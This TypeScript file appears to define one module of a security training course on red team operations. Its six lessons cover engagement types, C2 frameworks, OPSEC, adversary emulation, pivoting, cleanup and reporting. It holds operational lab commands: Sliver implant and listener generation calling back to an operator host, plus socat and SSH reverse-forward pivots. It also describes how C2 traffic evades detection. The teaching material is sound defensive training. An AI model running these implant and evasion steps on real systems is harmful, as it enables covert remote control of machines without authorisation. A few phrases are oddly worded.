import type { Module } from "../curriculum";

export const module38: Module = {
  id: "module-38",
  slug: "38-red-team-operations",
  title: "Red Team Operations",
  description:
    "Emulating real adversaries: engagement lifecycle, C2 frameworks, OPSEC, campaign planning, and the reporting that drives real change.",
  language: "Red Team",
  lessons: [
    {
      id: 1,
      slug: "01-red-team-vs-pentest",
      title: "Red Team vs Pentest vs Adversary Emulation",
      level: "intermediate",
      tag: "concept",
      duration: "35 min",
      description:
        "What separates a deep engagement from a scan-and-report — plus Purple, SOAR-ish handoffs, and scoping reality.",
      content: `
# Red Team vs Pentest vs Adversary Emulation

## The spectrum

| | Pentest | Red Team | Adversary Emulation |
|--|---------|----------|---------------------|
| Goal | Find vulnerabilities | Test DETECTION + RESPONSE | Replicate a specific APT's behavior |
| Timing | Typically days | Weeks-months, stealthy | Focused on a named actor TTP set |
| Stealth | Minimal (scans are fine) | High (evade the defenders) | High |
| Deliverable | Vuln report | 'How well did you detect?' report + gaps | ATT&CK-mapped chain |

## What red teaming tests

- Detection: did the SOC/EDR/SIEM catch the operation?
- Response: could they contain, investigate, and recover?
- Human: phishing that worked, MFA gaps, policy holes
- OPSEC: can the attacker sustain independence (C2 survives)?

## Adversary emulation in practice

- Choose a real threat actor (from a CTI report: e.g., a specific APT)
- Map their known TTPs to ATT&CK techniques
- Execute a chain that replicates their sequence
- Compare results vs the mapping — where did defense hold?

## Purple team (people to befriend)

- Red + Blue run TOGETHER: red forces a technique, blue shares detection learnings immediately
- Purpose: rapid improvement, not proof
- The modern default, honestly better than 'us vs them'

## Scoping realism

- RoE must define: can you hit backups? cloud production? can you trigger pager? (usually yes, carefully)
- Goals in writing: "detect the operation within X hours" / "exfil simulated data in a sandbox"
- Kill switches: emergency stop-word + 'stop if production harmed'

> Red teaming is a detection-and-response bootcamp with a budget. Depth, stealth, and evaluation — not vuln counting — are the metrics.
`,
      defaultCode: `// engagement-shape decision
const engages = {
  pentest: { find: 'vulns', stealth: false },
  redteam: { find: 'detection-gaps', stealth: true },
  emulation: { find: 'a-specific-actor', stealth: true }
};
console.log('Choose by client question:');
console.log('  "what can you break?" -> pentest');
console.log('  "would you get caught?" -> redteam/emulation');`,
      solution: `const engages = {
  pentest: { find: 'vulns', stealth: false },
  redteam: { find: 'detection-gaps', stealth: true },
  emulation: { find: 'a-specific-actor', stealth: true }
};
console.log('Choose by client question:');
console.log('  "what can you break?" -> pentest');
console.log('  "would you get caught?" -> redteam/emulation');`,
      hint: "Pentests find vulnerabilities; red teams test detection & response; emulation mimics a named actor.",
      challenge: `**Home Lab — Read a Red Team Report:**
1. Find a public red team report or case study (e.g., from a vendor blog or DEF CON slides).
2. Note: rules of engagement, environmental horology, the chain, detection outcomes.
3. Write 3 metrics that report used (was it detection-time? coverage?).
4. Sketch: a red team goal for YOUR imaginary org (what should SOC catch in X hours?).
5. Compare to what a pentest would have delivered in 3 bullets.`,
    },
    {
      id: 2,
      slug: "02-c2-frameworks",
      title: "Command & Control Frameworks",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Cobalt Strike (concepts), Sliver, Metasploit, mythic — beacons, listeners, profiles, and how C2 evades (and gets caught).",
      content: `
# Command & Control Frameworks

## Why C2 is the C in adversary-simulation

An engagement needs a *stable* channel back to the operator: command & control. The framework is your remote shell with panache.

## The mainstream C2 family

| Framework | Notes |
|-----------|-------|
| **Cobalt Strike** | The classic commerical; beacons, malleable C2, aggressor scripts. (Named but license-gated — most red teams buy it, students learn with free) |
| **Sliver** (free/open) | Modern alternative; implants for Win/Linux/Mac; DNS/mTLS/HTTP etc. |
| **Mythic** | Free/OSS agent + plugin architecture |
| **Metasploit** (payload + meterpreter) | Classic; fine for labs |
| **HAVOC / SilentTrinity** | Enthusiast-grade, learning-fun |

## Beacon / implant anatomy

\`\`\`
Implant (agent) sleeps -> wakes on jitter -> beacons to listener
    -> receives commands, executes, exfils via the channel
Malleable C2 profile (CS): taints traffic (JSP/HTML-like) to blend
\`\`\`

## Listener profiles & evasion

- HTTP/HTTPS listeners on 80/443 (blend); DNS listeners (quiet, slow)
- Jitter + sleep avoids beacon periodicity detection
- Malleable profiles change the wire shape (user-agent, HTML padding) to defeat JA3/beaconing rules
- 'Secret guard': beacon checks for its own fingerprint-causing red flags

## Defense view (so you learn the rules to beat)

- **Beaconing detection**: fixed periodicity + same-size payloads
- **JA3/S** fingerprinting of the TLS handshake
- **Process-context**: beacons from weird PIDs/Logs-in-Office
- **Live hunting**: beacon callbacks = the #1 C2 tell

## OPSEC of your own C2

- Split control plane from the EDR-visible plane
- Never run C2 on your own corp infra; pivot box isolated
- Log your actions (engagement trail) but keep the C2 logged-in-layer separate
> C2 is the skeleton of an engagement. Free tools (Sliver/Mythic) teach the craft; evasion insights become detection-alert material for your blue skill.
`,
      defaultCode: `# Sliver quickstart (conceptual; free tool)
sliver
generate --mtls 10.0.0.10:8888 --os linux --arch amd64 --save /tmp/beacon
mtls --lhost 10.0.0.10 --lport 8888
# then transfer/execute the implant = a beacon shell:
sessions
# (lab environment only; never on systems you don't own)`,
      solution: `sliver
generate --mtls 10.0.0.10:8888 --os linux --arch amd64 --save /tmp/beacon
mtls --lhost 10.0.0.10 --lport 8888
sessions`,
      hint: "Beacons + sleep/jitter + profiles = stealthy; the blue mirror is beaconing/JA3 analysis.",
      challenge: `**Home Lab — First Beacon (Free C2):**
1. Install Sliver on Kali.
2. Generate a linux implant, run it on a LAB VM, catch the session.
3. Evaluate: beaconing pattern observable from your blue-eyes (netstat on the VM)?
4. Tune sleep/jitter; re-observe.
5. Write 4 detection ideas a blue team could write for C2 (beaconing, JA3, process, DNS).`,
    },
    {
      id: 3,
      slug: "03-engagement-lifecycle-ops",
      title: "Red Team Lifecycle & OPSEC",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "Kickoff, recon, establish, expand, persist (simulated), objectives, cleanup — and the OPSEC ethos that separates pros from script-kiddies.",
      content: `
# Red Team Lifecycle & OPSEC

## The lifecycle (long-form)

\`\`\`
1. Kickoff: goals, RoE, contact sheet, kill words
2. Recon: OSINT, phishing enumerations, drive-by candidates
3. Initial access: the phish/lure/cred shot
4. Establish: beacon, validate control-plane
5. Expand: privesc, lateral, approach objectives
6. Objective action: simulate data access (sandboxed/tagged), screenshots
7. Persistence-simulation (if asked): leave a 'red team owned' marker (north)
8. Cleanup: remove artifacts, restore configs, confirm RoE compliance
9. Report + debrief with blue (timeline of detection wins/losses)
\`\`\`

## OPSEC ground rules

- One identity per channel; message-splitting; no cross-links
- Keep a *separate* operator account stack from anything personal
- Blunders: posting screenshots with usernames, using corp auth for testing
- Log everything (for the report), but compress sensitive detail

## Measure twice, clean once

- Every artifact cataloged & removed; configs returned; accounts disabled
- 'Red team owned' flags deleted (they're NOT your trophies to leave)
- Confirm with blue: nothing extra left behind

## Reporting: the blue-kiss

The report structure:

\`\`\`
Executive: engagement goal + whether detection worked
Narrative: the chain (recon→access→objective) with timestamps
Detection log: when did blue notice? what fired/not?
Gaps: specific detection/blindspot findings with fixes
Action items: prioritized, owned, dated
\`\`\`

> A pro red team measures victory by the *lessons blue gains*, then cleans the battlefield completely. Unclean teams poison their own engagement.
`,
      defaultCode: `// lifecycle checklist as data
const phase = [
  'kickoff', 'recon', 'initial-access', 'establish',
  'expand', 'objective', 'persistence-sim', 'cleanup', 'debrief'
];
for (const [i, p] of phase.entries()) console.log((i + 1) + '. ' + p);
console.log('After-action: artifacts removed, configs restored, flags gone');`,
      solution: `const phase = [
  'kickoff', 'recon', 'initial-access', 'establish',
  'expand', 'objective', 'persistence-sim', 'cleanup', 'debrief'
];
for (const [i, p] of phase.entries()) console.log((i + 1) + '. ' + p);
console.log('After-action: artifacts removed, configs restored, flags gone');`,
      hint: "Kickoff→objective→cleanup→debrief; OPSEC is discipline, not tooling.",
      challenge: `**Home Lab — Your OPSEC Playbook:**
1. Write your personal OPSEC rules (accounts, cross-contamination, artifact marking).
2. Draft 'red team owned' marker design for a lab (a watermark/registry key).
3. Simulate the cleanup on a lab VM: install a service, note it, then remove and verify via services.msc/registry checks.
4. Write the 5-section report OUTLINE you'd use after an engagement.
5. List 2 mistakes a 'script-kiddy style' operator would make that you won't.`,
    },
    {
      id: 4,
      slug: "04-adversary-emulation-campaign",
      title: "Adversary Emulation: Build a Campaign",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Pick a known APT, map its TTPs to ATT&CK, build a chain, execute it in your lab, and measure your own detections.",
      content: `
# Adversary Emulation: Build a Campaign

## The design process

\`\`\`
1. Select an actor (from a CTI report, e.g., 'APT41') 
2. List their 10-ish core TTPs with ATT&CK IDs
3. Prioritize what you can emulate safely in-lab
4. Build the chain as a runbook (step → tool → detection blink)
5. Execute in a staged lab; track detection events
6. Compare against ATT&CK layer: which techniques were 'caught'?
\`\`\`

## Example mini-chain (lab-adapted)

\`\`\`
Phishing (T1566) -> document macro (T1204/T1059) 
 -> PowerShell cradle (T1059.001) 
 -> beacon C2 (T1071/T1041) 
 -> credential dump attempt (T1003) 
 -> lateral AS-REP toast (T1558.004) 
 -> 'objective' file staged in a marked folder
\`\`\`

## The runbook as your deliverable

Each step:
\`\`\`
- Technique (ATT&CK ID)
- Exact tooling + commands (repeatable)
- Expected detection (which rule *should* fire?)
- Observed result (did it? alert noise?)
- OPSEC notes
\`\`\`

## Measuring what mattered

- Detection coverage map: what fired for which technique
- Detection latency: when did blue's log arrive vs the action
- Effectiveness: which techniques completely bypassed
> The emulation report is the most actionable doc a red team produces: 'imitate actor Y, here's exactly what your detection missed, here's the rule.detection you should add'.
`,
      defaultCode: `// build an emulation runbook object
const runbook = [
  { step: 1, technique: 'T1566.001', tool: 'phish-lure (simulated)', expected: 'mail-gw sandbox', fired: false },
  { step: 2, technique: 'T1059.001', tool: 'ps1 cradle', expected: 'script-block-log', fired: true },
  { step: 3, technique: 'T1071.001', tool: 'c2-http', expected: 'netmon beacon rule', fired: false }
];
runbook.forEach(r => console.log(r.step, r.technique, 'fired?', r.fired, '(expected:', r.expected + ')'));`,
      solution: `const runbook = [
  { step: 1, technique: 'T1566.001', tool: 'phish-lure (simulated)', expected: 'mail-gw sandbox', fired: false },
  { step: 2, technique: 'T1059.001', tool: 'ps1 cradle', expected: 'script-block-log', fired: true },
  { step: 3, technique: 'T1071.001', tool: 'c2-http', expected: 'netmon beacon rule', fired: false }
];
runbook.forEach(r => console.log(r.step, r.technique, 'fired?', r.fired, '(expected:', r.expected + ')'));`,
      hint: "Pick an actor, map their TTPs, build a repeatable runbook, execute in-lab, measure detection.",
      challenge: `**Home Lab — Mini Emulation:**
1. Choose an actor from a public report (or make one up).
2. Build a 4-step chain you CAN run safely in your lab.
3. Execute it while your Suricata/Sysmon telemetry runs.
4. Record: which steps fired detection, which were silent (coverage gap!).
5. Write the 'gap-fix' suggestion per silent technique.`,
    },
    {
      id: 5,
      slug: "05-pivot-persistence-cleanup",
      title: "Advanced Pivoting, Persistence Simulation & Cleanup",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "The hard middle: pivot techniques beyond SSH, golden-ticket simulation, and the full artifact-removal checklist that ends an engagement honestly.",
      content: `
# Advanced Pivoting, Persistence Simulation & Cleanup

## Pivoting catalog (beyond basics)

| Technique | Use case |
|-----------|----------|
| **SSH -L/R/D** | classic tunnel (already learned) |
| **Socks5 + proxychains** | sweep the far net |
| **Port forwarding in heartbeat (C2)** | dynamic tunnels via implant |
| **SSH remote forward (R)** | make your box reachable FROM internal ('expose kali') |
| **Netcat relays / socat** | chain hops without SSH |
| **DNS tunneling** (iodine/dns2) | when only DNS leaves |
| **Metasploit route + portproxy** | MSF-native toggle |

\`\`\`
# socat relay example (lab):
socat TCP-LISTEN:8888,fork TCP:10.0.0.5:80
# ssh remote forward: external into internal service
ssh -R 127.0.0.1:8443:10.0.5.10:443 user@internal-box
\`\`\`

## Persistence simulation & golden-ticket

- **Golden ticket** (lab demo): DCSync krbtgt → mint fakeadmin tickets (as learned in M28) — used in emulation as 'the adversary would keep reign'
- **Scheduled-tasks/Run keys** (simulate) — mark every persistence intent with a clearly-labeled marker
- Purpose: teach blue where to look; never leave REAL persistence on prod

## Cleanup = the engagement's last 20% (don't skip)

Checklist per engagement:

\`\`\`
- restore modified configs/registry/ADS
- remove created users, group memberships, scheduled tasks/services
- delete uploaded files, download cradles, temp artifacts
- clean added firewall rules, DNS entries
- revoke/delete test credentials & tokens
- final: re-run your scan = system matches baseline
\`\`\`

## Why cleanup is non-negotiable

- Leaving backdoors = illegal in most scopes (and dangerous)
- It's the difference between 'a test' and 'a crime with your name on it'
- Blue handout: 'here is exactly what we touched, restore it yourself, done'
> The pivot chain is how engagements reach objectives; the cleanup is how professionals stay licensed. Both matter equally.
`,
      defaultCode: `// cleanup checklist object
const cleanup = [
  'configs/registry restored',
  'users & memberships removed',
  'scheduled tasks/services deleted',
  'uploaded files deleted',
  'test creds/tokens revoked',
  'final scan matches baseline'
];
cleanup.forEach((item, i) => console.log((i + 1) + '. ' + item));
console.log('non-negotiable: no real persistence left on prod');`,
      solution: `const cleanup = [
  'configs/registry restored',
  'users & memberships removed',
  'scheduled tasks/services deleted',
  'uploaded files deleted',
  'test creds/tokens revoked',
  'final scan matches baseline'
];
cleanup.forEach((item, i) => console.log((i + 1) + '. ' + item));
console.log('non-negotiable: no real persistence left on prod');`,
      hint: "Pivot deep, simulate persistence with markers, clean 100% before the debrief.",
      challenge: `**Home Lab — Pivot + Clean:**
1. Build a 3-tier lab (Kali→DMZ→internal) and pivot via SSH -R and socat relay; hit the far service.
2. Simulate persistence: add a scheduled task with a clearly marked name in the LAB.
3. Then execute the FULL cleanup checklist above (restore, delete, revoke).
4. Re-run your checks: task gone, service gone, files gone.
5. Write 3 lines on why 'they'd never notice our backdoor' reasoning is fatal.`,
    },
    {
      id: 6,
      slug: "06-red-team-reporting",
      title: "Reporting & Blue-Team Collaboration",
      level: "advanced",
      tag: "concept",
      duration: "40 min",
      description:
        "Turning operations into improvement: the red-team report, debrief cadence, action tracking, and how red teams make blue teams better.",
      content: `
# Reporting & Blue-Team Collaboration

## The red team report (read the client's 'blue' value)

Standard sections (previous module had outline; now the craft):

\`\`\`
Executive: goal, whether detection worked, business-risk framing
Operational: timeline + narrative (kill chain with detections marked)
Detection log: every blue alert vs the operation (fired/not, latency)
Vulnerabilities vs Gaps: split 'vulns found' from 'detection gaps'
Remediation: prioritized, owner, target date
\`\`\`

## The debrief: it's a partnership

- Present the *evidence*, not the gotcha
- Blue tells you where they tripped; you tell them which technique goes where
- Agenda: goal / observations / gap list / recommendations / action owners
- Cadence: weekly ops sync + end-of-engagement full-wash

## Metrics blue ACTUALLY improves

- **Detection coverage** per ATT&CK (map of fired/silent)
- **Detection latency** (time from action to alert)
- **MDR/SOC response time** (dispatch to contain)
- **IOC/OA lift**: rules added/updated from this engagement

## Action tracking

\`\`\`
Every engagement ends with a 'fix backlog':
  gap -> technique(s) -> recommended detection -> owner -> due
Track at next kickoff: were last engagement's fixes in place?
\`\`\`

## The ethical spine

- Never embarrass the SOC publicly; your job is their upgrade
- Share the exact detection ideas, not just the finding
- Follow-up: 60-90 days later, re-emulate top-3 gaps to prove improvement

> The report's final page is a roadmap for blue, not a trophy case for red. Emulate less to embarrass, more to educate.
`,
      defaultCode: `// actionable-gap record
const gaps = [
  { technique: 'T1071.001', fix: 'netmon beacon rule', owner: 'det-eng', due: '2026-02-01' },
  { technique: 'T1133', fix: 'MFA on VPN + alert', owner: 'infra', due: '2026-01-15' }
];
for (const g of gaps) console.log(g.technique, '->', g.fix, '|', g.owner, '|', g.due);`,
      solution: `const gaps = [
  { technique: 'T1071.001', fix: 'netmon beacon rule', owner: 'det-eng', due: '2026-02-01' },
  { technique: 'T1133', fix: 'MFA on VPN + alert', owner: 'infra', due: '2026-01-15' }
];
for (const g of gaps) console.log(g.technique, '->', g.fix, '|', g.owner, '|', g.due);`,
      hint: "Gaps get owners + dates; next engagement checks last round's fixes.",
      challenge: `**Home Lab — The Improvement Flywheel:**
1. Write the 60-day 're-run' plan for your last mini-emulation.
2. Define 3 metrics blue should track this quarter (coverage/latency/action).
3. Draft the debrief agenda you'd run with a SOC lead.
4. Set a calendar reminder: evaluate those metrics monthly.
5. Write 3 sentences on 'red teams exist to level up blue'.`,
    },
  ],
};